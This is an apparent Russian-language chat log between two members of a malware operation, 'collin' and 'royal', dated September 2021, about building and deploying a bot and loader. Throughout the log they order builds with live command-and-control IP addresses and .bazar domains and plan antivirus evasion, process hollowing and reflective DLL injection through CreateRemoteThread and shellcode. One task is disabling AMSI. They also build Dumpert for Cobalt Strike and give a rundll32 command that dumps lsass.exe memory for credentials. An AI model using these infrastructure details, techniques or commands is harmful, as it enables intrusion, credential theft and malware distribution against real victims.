[17.09.21 09:38:26] collin:		лучше сборку со статическим детектом делать, там крипт, менее критично
[17.09.21 09:40:00] royal:		Это не жертва функционала.
[17.09.21 09:40:12] royal:		Это просто по другому холловинг работает.
[17.09.21 09:40:21] royal:		И другие заголовки в запросе.
[17.09.21 09:41:09] collin:		ну логика работы поменялась, и как раз заказчик говорит что хуже стало работать. Может и совпадение конечно
[17.09.21 09:42:43] royal:		Сейчас палится уже с изменениями.
[17.09.21 09:43:15] royal:		Вчера повился детект.
[17.09.21 11:54:31] royal:		А ты пробовал запускать regsvr32.exe file.dll %cmdline%?
[17.09.21 11:54:39] royal:		Он ошибку выдаст.
[17.09.21 11:55:25] royal:		Скажет что не знает такого аргумента если он будет отличаться от своих родных.
[17.09.21 11:56:39] collin:		продублируй плз
[17.09.21 11:56:47] royal:		А ты пробовал запускать regsvr32.exe file.dll %cmdline%?
Он ошибку выдаст.
Скажет что не знает такого аргумента если он будет отличаться от своих родных.
[17.09.21 11:57:20] royal:		Я по этому из закрепа использую rundll32
[17.09.21 11:57:33] collin:		у меня работает в лоадере, он себя перезапускает, в процессе, параметры лоадера дописывает после file.dll
[17.09.21 11:59:42] royal:		А у меня ошибку выдает
[17.09.21 11:59:45] royal:		regsvr32.exe .\dl2_x64.dll {0000000}
[17.09.21 11:59:59] royal:		Окнос ошибкой сразу.
[17.09.21 12:00:18] collin:		из командной строки?
[17.09.21 12:00:25] royal:		Недопустимый параметр.
[17.09.21 12:00:27] royal:		Да.
[17.09.21 12:00:39] collin:		понял, проверю еще раз
[17.09.21 12:00:45] collin:		может в каких-то условиях не запускается
[17.09.21 12:00:55] royal:		Недопустимый параметр командной строки "-outputFormat"
[17.09.21 12:01:05] collin:		у меня перезапуск через CreateProcess и запуск командой из авторана в реестре было - точно работает
[17.09.21 12:01:12] royal:		Там правила есть какие то точно на аргументы.
[17.09.21 12:09:13] royal:		Это в powershell проявляется
[17.09.21 12:09:23] royal:		В cmd.exe прокатывает.
[17.09.21 12:09:41] royal:		Наверное из-за скобок фигурных в powershell
[17.09.21 12:12:05] royal:		Хотя нет. Если какой нибудь аргумент неизвестный ему дать -arg или /arg окно с ошибкой будет.
[17.09.21 12:12:25] royal:		Короче тот кто аргументы использует должен это учитывать.
[17.09.21 12:12:58] royal:		Просто текст без - или / в начале прокатывает.
[17.09.21 12:13:59] collin:		понятно
[17.09.21 13:02:49] royal:		11 %runtype% %timeout% %pid% %cmdline%
[17.09.21 13:03:02] royal:		%pid% обязательно будет в команде?
[17.09.21 13:03:12] royal:		Там где не нужен будет 0.
[17.09.21 13:03:16] royal:		Правильно?
[17.09.21 13:07:57] royal:		Тест
[17.09.21 13:10:22] collin:		да будет всегда
[17.09.21 13:10:31] royal:		Теставая админка меня не пускает.
[17.09.21 13:10:37] collin:		во всех режимах кроме одного - значение игнорируй
[17.09.21 13:10:39] royal:		Там есть новая команда dll?
[17.09.21 13:10:59] collin:		тестовую админку недавно обновили с новой прото2
[17.09.21 13:11:12] collin:		учетка такая же должна быть
[17.09.21 13:11:19] collin:		как на прото2
[17.09.21 13:11:36] collin:		команды пока еще нет, альфонс делает
[17.09.21 13:12:28] royal:		Понял.
[20.09.21 08:22:33] collin:		привет!
[20.09.21 08:22:49] collin:		у тебя в сборке уже работуют шумовые запросы сейчас?
[20.09.21 08:26:50] royal:		Привет. Работают.
[20.09.21 08:27:03] collin:		отлично!
[20.09.21 08:27:39] collin:		еще - запомни то состояние сборки, какое было в четверг, в группе 20
[20.09.21 08:28:29] collin:		то что ты писал по изменениям - особенности холловинга, хедеры в запросах
[20.09.21 08:28:52] collin:		возможно придется вернуться к этой конфигурации, если будут проблемы
[20.09.21 08:29:14] collin:		т.к. заказчики путают меня - старший сказал все плохо было а его сапп наоборот говорит хороший отстук..
[20.09.21 08:29:47] royal:		Хорошо.
[20.09.21 08:30:01] royal:		А сейчас ничего нету там.
[20.09.21 08:30:19] collin:		адреса/сервера сломались, жду когда админы починят
[20.09.21 08:30:27] royal:		Понял.
[20.09.21 12:19:43] collin:		сделай сборки группы 19 и 20
[20.09.21 12:19:57] collin:		сделай сборки группы 19 и 20
[20.09.21 12:20:06] collin:		x64, regsvr32
[20.09.21 12:20:08] collin:		адреса и базары:
[20.09.21 12:20:14] collin:		```
адреса (домены) первого этапа
бот:
167.172.106.21
167.172.106.137
167.172.102.214
167.172.110.210

лоадер:
167.172.110.210
167.172.102.214
167.172.106.21
167.172.106.137

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.09.21 12:20:17] collin:		направь wild
[21.09.21 07:10:31] collin:		привет!
[21.09.21 07:10:53] collin:		https://privatlab.com/s/v/ydjdqGDqQMTRMd2elOb2
материалы к новой задаче "Отключение AMSI в Powershell"
[21.09.21 07:11:19] collin:		она не срочная, в плановом режиме делай
[21.09.21 07:11:25] collin:		подтверди получение
[21.09.21 07:12:06] royal:		Привет. Получил.
[21.09.21 08:13:16] collin:		сделай сборку - группа 20
[21.09.21 08:13:22] collin:		x64, regsvr32
[21.09.21 08:13:24] collin:		адреса и базары:
[21.09.21 08:13:34] collin:		```
адреса (домены) первого этапа
бот:
167.172.103.195
167.172.104.86
167.172.106.204
167.172.110.154

лоадер:
167.172.106.204
167.172.110.154
167.172.103.195
167.172.104.86

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[21.09.21 08:13:37] collin:		направь wild
[21.09.21 08:17:15] collin:		2) сделай сборку группа 6
[21.09.21 08:18:07] collin:		x86, в двух режимах generic и rundll32
[21.09.21 08:18:12] collin:		адреса и базары те же
[21.09.21 08:18:17] collin:		направь porfirio
[21.09.21 12:45:19] collin:		как доделаешь команду "Run DLL" - займись задачей 638
[21.09.21 13:23:24] royal:		Получал такое?
"Сейчас другой клиент просит сделать ему незаметный маленький лоадер, чтобы он мог запускать длл файлы. С 3-4 линков взятые."
[21.09.21 13:23:30] royal:		От manuel.
[21.09.21 13:25:32] collin:		видел
[21.09.21 13:25:34] collin:		ответил ему
[21.09.21 13:26:03] collin:		у тебя был такой лоадер или похожий?
[21.09.21 13:26:54] royal:		Был. Там прмитив, просто скачивается файл и запускается.
[21.09.21 13:27:15] royal:		Шифрование xor 1 байт файла на сервере.
[21.09.21 13:28:43] collin:		когда последний раз использовался примерно?
[21.09.21 13:28:57] collin:		и чистил когда
[21.09.21 13:29:18] royal:		Год назад.
[21.09.21 13:29:45] royal:		В ноябре прошлого года.
[21.09.21 14:23:51] collin:		сделай сборку
[21.09.21 14:23:58] collin:		группа 35, x64, regsvr32
[21.09.21 14:24:02] collin:		адреса и базары:
[21.09.21 14:24:08] collin:		```
адреса (домены) первого этапа
бот:
167.172.103.195
167.172.104.86
167.172.106.204
167.172.110.154

лоадер:
167.172.106.204
167.172.110.154
167.172.103.195
167.172.104.86

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[21.09.21 14:24:12] collin:		направь wild и мне продублируй
[21.09.21 15:00:25] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAp3nkPrlXY6SWLsw2PA6Cw86nliu1ohBVUVAJktvH5byQ
leYk+OHwhpL5YYr8N8J/tM+sNMs74p/4j2+QGNOcCqhQUX8z4/RXjXHYqk62LTr3
0we47//KtAdrFnmFERghBpHGTv7Dto/ECSWNxTvitu05ywNbh2+DC5oM+vFFkwm0
OEGvcQylNPDYn6ZchPXGR5c9YItlZ2aqZQ8tHuk39cP782yRduvRR85CVpZ1Pkn2
8TDYpUjMK7nu+UMxCKScSUERVqqG9vfJwsjwn4y25NYK7O42rZYGNPoDyJ+zE7Ig
FCmGHUIZ/mmeOyiEYUYR6vldVIWvbWHtdJ869QmIhpd/mBZd5xfi+PmJrW4FJeRP
pTOj+UcgXa6Q6OIZeGoaiWNyXzFUKTCdButeeIYDwFqxHVVw3zejboB716mAu+Fz
2Kb99T8JBzjZcBXgjAb1eTUDXjWRb+vwE/IRBHk6aZ5xJvUbdh0egrp89nsWI763
8/L7ezSXOJFiTX7Upi3lEYDd5W5P1B7ZRPBW2jq2yT1R8m/DTITMQRXPLh4vsGnq
Aq6baqPKXZiYhjwTiCpmLA632YLMYfLMYytgBHDkiwO+Xd7sgp2WORRTKFFmCD7l
80alcV4ArGIa7lw22artsmGzMCC0tBGfs9eZRJJXl2VESIOXiiOfkB9UEBevw3bS
wDoBiVy26q7z0ZaJoE7mZsFQaz+/zY5C03+vF0MOMwFMg4MCOmHmvFpk5XMgbmAK
7CoPu4O93HKpqa87bi+f99kK7/hQfxjsoNFsS0JdCk5vPXpKOV4Fs+mAznnZ7fOi
VKW4qHMC9GgCYpRRbH7D56mSxehH23RyA6NkcrfiUUx46ZksYDDIz6q45oE0zqEt
ibqeThs8ebBfJuik6ACT6n825fi/xaNWbqAVTCxU8hBhE76RUpkif/YNKrNsNQxN
RrpehhsmCWhb9aH2wqioo7XGT5A4L2bka42qt9WBWCYj9jfY50xyBPuLUBrzWMFk
E0fLZ4q03eY83Ybb
=FKpc
-----END PGP MESSAGE-----
[21.09.21 15:00:31] royal:		NOD 32 один.
[21.09.21 15:23:45] collin:		+
[22.09.21 09:24:30] collin:		привет!
[22.09.21 09:24:38] collin:		подскажи по сборке clang
[22.09.21 09:24:49] collin:		`clang++ -std=c++1y -stdlib=libc++ -lc++abi sample.cpp -o sample` - вот так написали собирать
[22.09.21 09:25:04] collin:		как это сделать в студии со стандартным clang или llvmo?
[22.09.21 09:25:49] collin:		`-stdlib=libc++ -lc++abi` - вот про эти две опции точнее, это доп. компоненты нужны какие-то?
[22.09.21 09:28:04] royal:		-std=c++1y это c++ 14
[22.09.21 09:28:25] royal:		По умолчанию включен в 2019 студии.
[22.09.21 09:28:57] collin:		а в 2015 он урезанный?
[22.09.21 09:29:40] royal:		Посмотри Общие->Стандарт языка
[22.09.21 09:29:49] royal:		Есть там у тебя C++ 14
[22.09.21 09:30:17] collin:		есть но он походу не полный, т.к. проект в 2015 не компилится, только в 2019
[22.09.21 09:30:42] collin:		я думал это только msvc компиллера касается
[22.09.21 09:32:33] royal:		clang-cl понимает все параметры почти из cl
[22.09.21 09:33:27] collin:		```
1>clang-cl : warning : unknown argument ignored in clang-cl: '--stdlib=libc++' [-Wunknown-argument]
1>clang-cl : warning : unknown argument ignored in clang-cl: '--lc++abi' [-Wunknown-argument]
```
[22.09.21 09:33:29] collin:		вот так написал
[22.09.21 09:35:14] royal:		Там надо писать парметры с /
[22.09.21 09:36:12] collin:		да тоже самое
[22.09.21 09:37:32] royal:		Типа так /stdlib:libc++ /lc++abi
[22.09.21 09:37:54] royal:		clang-cl понимает аргументы так же как cl
[22.09.21 09:39:03] collin:		```
1>clang-cl : warning : unknown argument ignored in clang-cl: '--stdlib=libc++' [-Wunknown-argument]
1>clang-cl : warning : unknown argument ignored in clang-cl: '--lc++abi' [-Wunknown-argument]
```
[22.09.21 09:39:23] collin:		```
1>clang-cl : error : no such file or directory: '/stdlib:libc++'
1>clang-cl : error : no such file or directory: '/lc++abi'
```
[22.09.21 09:39:25] collin:		теперь вот так
[22.09.21 09:39:42] royal:		Ты где это написал?
[22.09.21 09:39:59] royal:		C++->Командная строка
[22.09.21 09:40:09] royal:		В настройках проекта.
[22.09.21 09:40:13] collin:		да
[22.09.21 09:40:22] royal:		Дополнительные параметры внизу.
[22.09.21 09:41:02] collin:		д атам
[22.09.21 09:42:30] royal:		Сейчас. Найду параметр для clang-cl который используется для передачи аргументов как в обычном clang.
[22.09.21 09:45:04] royal:		-Xclang -stdlib=libc++
[22.09.21 09:45:16] royal:		-Xclang <парметр как в clang>
[22.09.21 09:45:36] royal:		-Xclang --lc++abi
[22.09.21 09:48:40] royal:		-lc++abi что то не могу найти в интеренте что такое.
[22.09.21 09:51:57] royal:		Нашел /clang:<праметр>
[22.09.21 09:52:22] royal:		Типа /clang:-stdlib=libc++
[22.09.21 09:53:41] collin:		`/clang:-stdlib=libc++` вот так походу работает
[22.09.21 09:53:52] collin:		только надо либу ставить эту
[22.09.21 09:59:29] royal:		А зачем? Ты же не используешь стандартные библиотеки.
[22.09.21 10:01:13] collin:		используется "std::transform", студия пишет что такой либы нет (без подключения еще одного заголовочного файла)
[22.09.21 10:01:31] collin:		такой функции*
[22.09.21 10:01:35] collin:		полагаю она в libc++ этом
[22.09.21 10:02:19] royal:		Тогда размер у тебя увеличиться раза в 2-3
[22.09.21 10:02:38] royal:		Заменителя нету?
[22.09.21 10:02:48] collin:		да это отдельная задача, размер не принципиален
[22.09.21 10:03:17] royal:		А что в msvc нету transform?
[22.09.21 10:03:40] royal:		clang-cl использует стандартную библиотеку msvc по умолчанию.
[22.09.21 10:03:48] collin:		есть, задача не в том была
[22.09.21 10:04:43] royal:		Установи clang из msys2
[22.09.21 10:04:59] royal:		Там все есть. Все либы какие захочешь.
[22.09.21 10:05:15] collin:		ок попробую
[22.09.21 10:12:12] royal:		И там кстати clang по умолчанию слинкован с gcc стандартной бибилиотекой. То что  тебе нужно.
[22.09.21 10:17:16] collin:		насчет простого лоадера про который Мануель спрашивал
[22.09.21 10:17:50] collin:		какой у тебя есть функционал 1) есть ли запуск dll 2) способ запуска файловый или бесфайловый с дропом?
[22.09.21 10:19:23] royal:		Файловый запуск из temp.
[22.09.21 10:20:20] royal:		Запуск dll тоже значит файловый.
[22.09.21 10:20:56] royal:		Командную строку поменять для rundll32 regsvr32 или через LoadLibrary, зависит от dll.
[22.09.21 10:21:17] collin:		скачивание нагрузки по URL-ссылке?
[22.09.21 10:23:26] royal:		Да.
[22.09.21 10:23:38] royal:		Или по нескольким и несколько запусков.
[22.09.21 10:24:41] royal:		У меня вопрос про dll команду. За правильную работу dll после ее инъекции отвечает автор dll? Его задача загрузить все необходимые для работы dll в процесс?
[22.09.21 10:25:27] royal:		Наша задача только сделать инъекцию в процесс запустить DllMain и экспортную функцию.
[22.09.21 10:27:33] royal:		Это косается только инъекции в чужой процесс. В свой легко загружать через LoadLibrary нужные библиотеки. А если за это отвечает автор dll, то и в свой процесс не нужно загружать тоже.
[22.09.21 10:30:19] royal:		Ну что не париться загрузкой библиотек из импорта dll в чужой процесс?
[22.09.21 10:33:27] collin:		уточню
[22.09.21 11:42:37] collin:		насчет рефлективной загрузки dll в чужой процесс - да надо в боте БК позаботиться об этом
[22.09.21 11:43:15] collin:		загрузить в хост-процесс прочие библиотеки, которые используются в статическом импорте нагрузки и еще не загружены в процесс
[22.09.21 11:44:44] royal:		Понятно.
[22.09.21 11:45:57] collin:		как это попроще сделать, есть мысли?
[22.09.21 11:46:11] royal:		Есть две мысли.
[22.09.21 11:47:02] royal:		Первая это аллоцировать память в процессе чужом, записать туда строку с именем библиотеки и вызвать LoadLibrary через CreateRemoteThread
[22.09.21 11:47:22] collin:		`https://en.wikipedia.org/wiki/DLL_injection` типа как здесь пример?
[22.09.21 11:47:25] royal:		Но для жтого нужно создать потоков ровно столько сколько надо загрузить бибьлиотек.
[22.09.21 11:47:52] collin:		если их много - много вызовов CreateRemoteThread, палевно наверное
[22.09.21 11:47:56] royal:		Вторая мысль шелл код. Тоже аллоцировать память но уже с массивом строк.
[22.09.21 11:48:13] royal:		Создать шелл код, который в цикле вызывает LoadLibrary
[22.09.21 11:48:28] royal:		Создать поток CreateRemoteThread с этим щелл кодом.
[22.09.21 11:48:48] royal:		Тогда один поток загрузит все что нужно.
[22.09.21 11:49:02] royal:		Второй вариант предпочтительней.
[22.09.21 11:49:12] royal:		Но я не умею писать шелл код.
[22.09.21 11:50:20] collin:		с шеллкодом поможем
[22.09.21 11:51:51] collin:		у elijah используется для бесфайлового перезапуска лоадера, я kermit hugo тоже подскажем
[22.09.21 11:52:24] collin:		тебе полюбому понадобится шеллкод наверное - чтобы 2 вызова сделать в нагрузке
[22.09.21 11:52:35] collin:		сначала DllMain, потом экспорт-функцию
[22.09.21 11:52:45] collin:		или есть другой вариант?
[22.09.21 11:54:54] royal:		DllMain можно через CreateRemoteThread и экспортную тоже.
[22.09.21 11:55:24] royal:		Найти их адрес в другом процессе и создать поток.
[22.09.21 11:55:24] collin:		в один вызов?
[22.09.21 11:55:38] royal:		Два потока получается.
[22.09.21 11:55:59] royal:		После окончания, второй.
[22.09.21 11:56:37] collin:		после завершения 1 потока результаты его отработки не разрушатся?
[22.09.21 11:57:14] royal:		Нет. А какие там результаты там могут быть.
[22.09.21 11:57:18] royal:		DllMain
[22.09.21 11:57:30] royal:		По коду возврата понимаем удачно или нет.
[22.09.21 11:57:44] collin:		неизвестно какая там может быть инициализация, может он айди потока сохраняет а в экспорт-функции потом использует
[22.09.21 11:58:01] collin:		желательно в один поток последовательно эти вызовы запихнуть
[22.09.21 11:58:16] collin:		поищу примеры, как-то это делалось наверняка
[22.09.21 11:59:08] royal:		Это сомнительно что в DllMain что то делается не штатное. Ведь после DllMain экспортные функции могут вызываться в обычной программе откуда угодно.
[22.09.21 12:00:12] royal:		Шелл код можно писать на C говорят.
[22.09.21 12:00:20] royal:		Попробую.
[22.09.21 12:00:29] collin:		можно в той же студии, я тестовый шеллкоды на ней делал
[22.09.21 12:00:35] collin:		нативный проект в одну функцию
[22.09.21 12:00:38] collin:		скину пример
[22.09.21 12:00:51] royal:		А возврат не зделал.
[22.09.21 12:00:54] royal:		return
[22.09.21 12:00:55] collin:		`нативный проект в одну функцию` -  ну или порядок компоновки функций учесть
[22.09.21 12:02:14] collin:		https://godbolt.org/ еще здесь можно
[22.09.21 12:03:05] royal:		Я думаю написать на C, потов в хекс редакторе вырезать функцию.
[22.09.21 12:03:57] collin:		`А возврат не зделал.` - да что-то не разобрался, с ним падало, оставил бесконечный цикл в конце
[22.09.21 14:25:43] royal:		Я тут по примеру сделал шелл код и там возврат работает.
[22.09.21 14:25:47] royal:		Нужен?
[22.09.21 14:25:56] royal:		Там тоже Hello World
[22.09.21 14:28:39] collin:		да скинь плз
[22.09.21 14:32:59] royal:		Download: https://qaz.im/load/kdhFB7/brEhyy   
Delete: https://qaz.im/index.php?a=delete&q=901791753
Пароль: ffvXFB89KP>-:tz_OH=c
[22.09.21 14:33:06] royal:		Это x64.
[22.09.21 14:33:11] collin:		https://privatlab.com/s/v/kMAAJ3okrWfGDXm7OyVN
[22.09.21 14:33:24] collin:		вот мой проект из которого делал, посмотри тоже
[22.09.21 14:34:17] royal:		Принял.
[22.09.21 15:00:14] royal:		x86 и x64
Download: https://qaz.im/load/bkDHNK/7aTFKi
Delete: https://qaz.im/index.php?a=delete&q=97189141
[22.09.21 15:00:23] royal:		Пароль: f`W/L)S$Su1@qZII,UGj
[22.09.21 15:00:44] royal:		Описание того как сделать самому https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c
[22.09.21 15:03:26] collin:		ага спасибо
[23.09.21 10:12:00] royal:		int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);
[23.09.21 10:12:24] royal:		Это экспортная функция всегда будет __stdcall? И в x64 тоже?
[23.09.21 10:12:52] royal:		Это из dll для рефлективной загрузки в другой процесс.
[23.09.21 10:13:09] royal:		Или она будет WINAPI
[23.09.21 10:13:28] royal:		в ч86 __stdcall в 64 __cdecl
[23.09.21 10:13:30] collin:		WINAPI=__stdcall, оно всегда так
[23.09.21 10:13:47] collin:		в x64 fasstcall, __stdcall игнорируется
[23.09.21 10:13:56] collin:		fastcall*
[23.09.21 10:14:56] collin:		`int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);` - вот такое объявление подходит для обоих архитектур, в задаче так и указал
[23.09.21 10:18:50] royal:		Параметры не имеют значения?
[23.09.21 10:18:57] royal:		Нулями можно?
[23.09.21 10:19:11] royal:		Для dll они не имеют значения по идее.
[23.09.21 10:19:42] royal:		Она сама должна все узнавать командную строку и т.д.
[23.09.21 10:21:26] collin:		да пока нулями
[23.09.21 13:20:30] royal:		Вопрос организационный.
[23.09.21 13:20:49] royal:		Когда мне можно будет в отпуск уйти в ближайшее время?
[23.09.21 13:25:47] collin:		после 13 октября
[23.09.21 13:25:49] collin:		т.к. сейчас Элиях уйдет тоже на 2 недели
[23.09.21 13:25:52] collin:		а ты на сколько хочешь?
[23.09.21 13:28:01] royal:		На 2 недели.
[23.09.21 13:29:06] royal:		18 октября например.
[23.09.21 13:31:06] royal:		Тест.
[23.09.21 13:31:21] royal:		Тест.
[23.09.21 13:31:28] royal:		На 2 недели.
18 октября например.
[23.09.21 13:31:29] collin:		видно
[23.09.21 13:31:43] collin:		с 18 по 31 октября, ок
[23.09.21 13:32:02] royal:		Договорились.
[23.09.21 13:32:10] collin:		напиши Силверу тоже об этом
[23.09.21 14:23:01] collin:		сделай сборку
[23.09.21 14:25:43] collin:		пока отбой
[24.09.21 11:55:09] collin:		привет!
[24.09.21 11:55:18] collin:		уточнение по команде run_dll
[24.09.21 11:55:42] collin:		в режиме рефлективного запуска в чужом процессе - запуск только в фоновом режиме, таймаут игнорируется
[24.09.21 11:56:25] royal:		Я так и думал, иначе убиват поток в чужом процессе можно ли вообще?
[24.09.21 11:56:39] royal:		Если можно то насколько палевно?
[24.09.21 11:58:04] collin:		не знаю делают ли так вообще, инфы не попадалось
[27.09.21 07:53:56] collin:		привет!
[27.09.21 07:54:01] collin:		сделай сборки группы 19 и 20
[27.09.21 07:54:09] collin:		x64, regsvr32
[27.09.21 07:54:11] collin:		адреса и базары:
[27.09.21 07:54:18] collin:		```
адреса (домены) первого этапа
бот:
161.35.29.127
161.35.27.53
161.35.19.83
161.35.17.114

лоадер:
161.35.19.83
161.35.17.114
161.35.29.127
161.35.27.53

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[27.09.21 07:54:23] collin:		напправь wild
[28.09.21 12:40:45] collin:		привет!
[28.09.21 12:40:53] collin:		сделай сборки группы 19 и 20
[28.09.21 12:40:57] collin:		x64, regsvr32
[28.09.21 12:41:01] collin:		адреса и базары:
[28.09.21 12:41:06] collin:		```
адреса (домены) первого этапа
бот:
164.90.226.23
164.90.226.25
164.90.226.27
164.90.236.133

лоадер:
164.90.226.27
164.90.226.25
164.90.226.23
164.90.236.133

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[28.09.21 12:41:13] collin:		направь wild
[29.09.21 09:10:31] collin:		привет!
[29.09.21 09:11:25] collin:		сделай перерыв по БК, возьми задачу от Силвера
[29.09.21 09:11:48] collin:		на сегодня, я так думаю там не долго
[29.09.21 09:11:59] collin:		```
https://github.com/k4nfr3/Dumpert

вот это надо собрать под запуск в кобальте, с нужной точкой входа

```
[29.09.21 09:12:19] collin:		про точку вот он писал раньше:
[29.09.21 09:12:21] collin:		```
12. Точка входа для Cobalt Strike:
#define DLL_API __declspec(dllexport)
extern "C" DLL_API void CALLBACK StartDLL(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
Вызывается так:

TStr DllCmdLine;
for(int i = 1; i < argc; i++)
    DllCmdLine += TStr(argv[i]) + (i < argc - 1 ? " " : "");
char *OutputData;
int OutputSize;
int *p = &OutputSize;
pStartDLL(HWND(&OutputData), HINSTANCE(&OutputSize), &DllCmdLine[0], SW_MAX + 1);
Точка входа блокирующая: вызывающий контекст можно блокировать на любое время, необходимое для завершения функции.
```
[29.09.21 09:32:23] royal:		Тупо скомпилировать с экспортной функцией?
[29.09.21 10:05:38] collin:		да пока так
[29.09.21 10:07:05] royal:		Там создается файл в C:\Windows\Temp
[29.09.21 10:07:28] royal:		Надо перенаправить вывод в HWND hwnd вместо файла?
[29.09.21 10:08:30] royal:		Вернее вернуть адрес буфера в hwd, размер в hinst?
[29.09.21 10:09:16] royal:		Или оставить как есть? Результатом работы является файл, как я писал выше, у меня этот файл 50+ мб.
[29.09.21 10:12:30] collin:		`pStartDLL(HWND(&OutputData), HINSTANCE(&OutputSize), &DllCmdLine[0], SW_MAX + 1);` - ты про это?
[29.09.21 10:12:46] royal:		Да.
[29.09.21 10:13:17] collin:		уточни у Силвера
[29.09.21 10:23:46] royal:		Еще уточнение. Там в кобальте DllMain используется?
[29.09.21 10:25:15] collin:		про DllMain инфы не было
[29.09.21 10:25:39] collin:		сделай формальную с  "return TRUE;"
[29.09.21 10:25:46] royal:		Значит в DllMain ничего не будет происходить.
[29.09.21 10:37:42] royal:		Сделал.
[29.09.21 10:39:22] collin:		ок
[29.09.21 10:39:58] collin:		ждем что Силвер дальше скажет по этой задаче
[29.09.21 10:44:34] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9HXLlUAan9VBqDWMmdzbqtaa8hmwNTJZ7J2LLPrPMrWBf
5Qrub3aX6Pdbg1yTcAQqAi2BjyvjKF82Rj9xS4CWwyZRd+Miw5WSrJHUL9J+mJTX
3jClrvAvErYnVERCRNJT9o4DM3Ej12Ow0cGvJRCrCY/oZ3VDmpkmFPFS3IPk3G09
0WFPMyU9f0wh4m2ujSsaaCG8tidO2dTjJ0hlC5vX/5WnXzZAXYXJ9Qokn71B72v1
bys4SosmMTdq7DaAi0m6dfGVlUsIo+iEX/BZAEkwhyOqDVHfF494XtWJu1qbnzyg
KrsDqiUYuxOSyqIHmhap338aAEU3eoUMEc9E2CGlVML6nGTNRgRAdGKsFBJvZchn
g8chl6evfnYwrl9HbM+kns8s2NA+VrnDQPuDAGs/3pkhM6EITMLIBK2jYfcaPBf8
1ks7JaOQyzu+wI6fVsP6wdjicmuqdOhL4ommBojNiVu/aQW6NXt3/FL5WwlJNV+N
dPr4IHT+ykmhIaccv3H+zW0KRcYsj41yQkeDdXeylYFWHCT1aTG+CBAgQkiEKBwm
fbMlWM5PIDVqQuLFBl9AIJ5cfZWeoJUD+8NI+ZadyXkA+/FO1a6ODfvmGSmyRG85
NfWQTnWvQwEsVDGFnBnKVQxdwbUs/T0lXKxxgSvt8MUtlVmDCWvXG8Q8MB/o+XjS
rQFdPL+qh9EOuQ3TGGpq7rneOttqXAv3CvqLeaf/Mvb1zOtED2W1Aii/yHCeVpTq
74y5Oz7ItCU27dOQM6EIJc+/ZCUapxvMncHpBHsWRWyQRnOPd37FiuaFFM3KMBdH
gMb6/57iJgy529rI3L0cHIdld+OXjqRgPsNhQklcuWS6u85rnMttnCDX/gJ1yzWf
HKUNFyZrYcsSYAZGIv+9/GBdhYjKkrkzhlLNFs5f
=/nYn
-----END PGP MESSAGE-----
[29.09.21 10:44:45] royal:		rundll32.exe Dumper.dll,StartDLL
[29.09.21 10:44:53] royal:		От администратора.
[29.09.21 10:45:18] royal:		В папке C:\Windows\Temp появится файл dumpert.dmp
[29.09.21 10:47:12] royal:		Для ифнормации. Этот файл - это минидамп памяти процесса lsass.exe
[29.09.21 10:47:32] collin:		принял спасибо!
[29.09.21 12:24:29] collin:		сделай сборку
[29.09.21 12:24:42] collin:		группа fat1, x64, rundll32(StartW)
[29.09.21 12:24:44] collin:		адреса и базары:
[29.09.21 12:24:51] collin:		```
адреса (домены) первого этапа
бот:
164.90.226.23
164.90.226.25
164.90.226.27
164.90.236.133

лоадер:
164.90.226.27
164.90.226.25
164.90.226.23
164.90.236.133

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[29.09.21 12:24:57] collin:		направь nick
[29.09.21 13:15:20] collin:		сделай одну доработку по БК в первую очередь - таск 653
[30.09.21 07:38:59] collin:		привет!
[30.09.21 07:39:26] collin:		сделай сборку - группа g11, x64, generic
[30.09.21 07:39:29] collin:		адреса и базары:
[30.09.21 07:39:38] collin:		```
адреса (домены) первого этапа
бот:
138.68.74.234
161.35.25.202
164.90.226.28
164.90.226.30

лоадер:
164.90.226.28
164.90.226.30
138.68.74.234
161.35.25.202

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.09.21 07:39:44] collin:		направь porfirio
[30.09.21 08:22:16] royal:		Там в g11 нету кук и сценария. Ты же их пишешь?
[30.09.21 08:24:23] collin:		а ты куки не обновляешь разве?
[30.09.21 08:25:19] royal:		Нет. Ты говорил что сам обновлять будешь.
[30.09.21 08:26:29] collin:		не мог я такого сказать, странно
[30.09.21 08:26:50] collin:		сейчас заполнил, дальше скажу отдельно как делать
[30.09.21 09:27:21] collin:		сделай сборку, группа 36
[30.09.21 09:27:30] collin:		x64, regsvr32
[30.09.21 09:27:36] collin:		адреса и базары:
[30.09.21 09:27:40] collin:		```
адреса (домены) первого этапа
бот:
5.183.78.108
213.59.119.200
195.133.192.89
5.181.80.115

лоадер:
195.133.192.89
5.183.78.108
5.181.80.115
213.59.119.200

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.09.21 09:27:44] collin:		направь wild
[30.09.21 09:51:21] royal:		34, 35 есть у меня. 36 группы нету.
[30.09.21 09:52:11] royal:		Тест.
[30.09.21 09:52:17] royal:		34, 35 есть у меня. 36 группы нету.
[30.09.21 09:53:22] collin:		добавил доступ, проверь
[30.09.21 09:53:46] royal:		Появилась.
[30.09.21 13:52:36] royal:		в админке тестовой есть команда или кнопка "повторить предыдущую команду"?
[30.09.21 13:59:54] collin:		нет
[30.09.21 13:59:58] collin:		раньше было, это упразднили
[30.09.21 14:00:24] royal:		А что упразднили? Тетсировать приходится постоянно копировать вставить делать.
[30.09.21 14:02:33] royal:		Там еще надо делать не активным комбобокс с выбором таймаута при запуске dll "inject (other)"
